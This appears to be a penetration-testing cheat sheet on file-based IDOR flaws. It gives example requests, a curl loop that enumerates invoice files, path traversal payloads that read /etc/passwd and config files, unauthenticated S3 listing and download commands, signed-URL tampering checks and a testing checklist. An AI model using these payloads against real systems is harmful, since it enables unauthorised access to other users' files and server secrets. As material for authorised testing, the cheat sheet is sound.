# IDOR - File-Based Object Reference

## Direct File Path/Name IDOR
```
GET /download?file=invoice_123.pdf
GET /files/user_456_report.docx
GET /uploads/2024/01/document_789.pdf
```

## Testing Approach
```bash
# Enumerate sequential file IDs/names
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code} invoice_$i.pdf\n" \
        "https://target.com/download?file=invoice_$i.pdf"
done
```

## Predictable File Naming Patterns
```
user_<id>_<filename>
<timestamp>_<original_filename>
<md5_of_something>.pdf
<sequential_number>.pdf
invoice-2024-0001.pdf, invoice-2024-0002.pdf...
```

## Path Traversal Combined with IDOR
```
GET /download?file=../../../etc/passwd
GET /download?file=..%2f..%2f..%2fetc%2fpasswd
GET /files/../../admin/config.php
```

## Signed URL / Token-Based Access Bypass
```
# If files served via signed URL with expiry
GET /download?file=doc.pdf&token=abc123&expires=1234567890

# Check if:
# 1. Token is validated server-side or just presence-checked
# 2. Expired tokens still work (no server-side expiry check)
# 3. Token can be reused for different file parameter (token not bound to specific file)
```

## Cloud Storage Direct Access (S3/Azure Blob/GCS)
```bash
# If app generates presigned URLs, check if bucket itself is also directly accessible
aws s3 ls s3://target-bucket-name/ --no-sign-request
curl https://target-bucket.s3.amazonaws.com/user_123/document.pdf

# Check for predictable bucket object keys
curl https://storage.googleapis.com/target-bucket/uploads/123.pdf
```

## Static File Serving IDOR
```
# Files served directly by web server without app-layer auth check
GET /uploads/user123/private_document.pdf   # Directly guessable path
GET /static/reports/2024/q1_financials.xlsx
```

## Document/Export Feature IDOR
```
GET /export/invoice/123
GET /reports/generate?userId=456
GET /pdf/receipt/789
```

## Testing Checklist
```
1. Identify file access pattern (by ID, by name, by hash, by signed URL)
2. Test if file identifier alone grants access without ownership check
3. Test path traversal in filename parameter
4. Test presigned/signed URL parameter tampering (change filename, keep token)
5. Check cloud storage bucket permissions directly (not just via app)
6. Test export/report generation endpoints for direct object reference to other users' data
```
